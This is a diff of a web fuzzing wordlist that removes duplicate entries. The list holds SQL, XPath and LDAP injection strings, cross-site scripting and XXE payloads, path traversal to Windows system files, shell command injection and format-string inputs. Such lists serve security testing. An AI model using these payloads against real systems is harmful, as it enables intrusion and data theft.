@@ -24,10 +24,8 @@ null
 %0a
 %00
 +%00
-\0
 \0\0
 \0\0\0
-\00
 \00\00
 \00\00\00
 $null
@@ -40,7 +38,6 @@ $NULL
 dir%00
 dir%00|
 |dir
-|dir|
 |/bin/ls -al
 ?x=
 ?x="
@@ -80,7 +77,6 @@ C:\boot.ini
 %01%02%03%04%0a%0d%0aADSF
 /,%ENV,/
 &lt;!--#exec%20cmd=&quot;dir&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;dir&quot;--&gt;
 %
 #
 *
@@ -116,7 +112,6 @@ C:\boot.ini
 #'
 !'
 !@#$%%^#$%#$@#$%$$@#$%^^**(()
-%01%02%03%04%0a%0d%0aADSF
 \t
 "\t"
 &#10;
@@ -129,7 +124,6 @@ C:\boot.ini
 #xA#xD
 /%00/
 %00/
-%00
 <?
 %3C
 %3C%3F
@@ -137,7 +131,6 @@ C:\boot.ini
 %5C
 %5C/
 %7C
-%00
 /%2A
 %2A
 %2C
@@ -274,8 +267,6 @@ something%00html
 '
 "
 #
--
---
 ' --
 --';
 ' ;
@@ -374,9 +365,6 @@ char%4039%41%2b%40SELECT
 &apos;%20OR
 'sqlattempt1
 (sqlattempt2)
-|
-%7C
-*|
 %2A%7C
 *(|(mail=*))
 %2A%28%7C%28mail%3D%2A%29%29
@@ -390,10 +378,7 @@ char%4039%41%2b%40SELECT
 %26
 !
 %21
-' or 1=1 or ''='
-' or ''='
 x' or 1=1 or 'x'='y
-/
 //
 //*
 */*
@@ -413,9 +398,7 @@ x' or name()='username' or 'x'='y
 <xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 <xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 <HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
-'
 '--
-' or 1=1--
 1 or 1=1--
 ' or 1 in (@@version)--
 1 or 1 in (@@version)--
@@ -429,7 +412,6 @@ xsstest%00"<>'
 <foo></foo>
 ))))))))))
 ../../../../../../../../../../boot.ini
-..\..\..\..\..\..\..\..\..\..\boot.ini
 ../../../../../../../../../../windows/win.ini
 ..\..\..\..\..\..\..\..\..\..\windows\win.ini
 || ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
@@ -457,16 +439,9 @@ http://<yourservername>/
 %2e0
 %2e
 .
-\
 ?*
-%20
-%00
 %2f
 %5c
-count(/child::node())
-x' or name()='username' or 'x'='y
-<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
-<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
 "<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
 "<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>"
 "<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>"
@@ -477,28 +452,14 @@ x' or name()='username' or 'x'='y
 "<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
 "<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
 "<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
-%00
-NULL
-null
-'
-"
-;
 <!
--
 =
 +
-"
-&
-!
-|
-<
 >
 "><script>alert(1)</script>
 %0d
-%0a
 %7f
 %ff
--1
 other
 %s%p%x%d
 %99999999999s
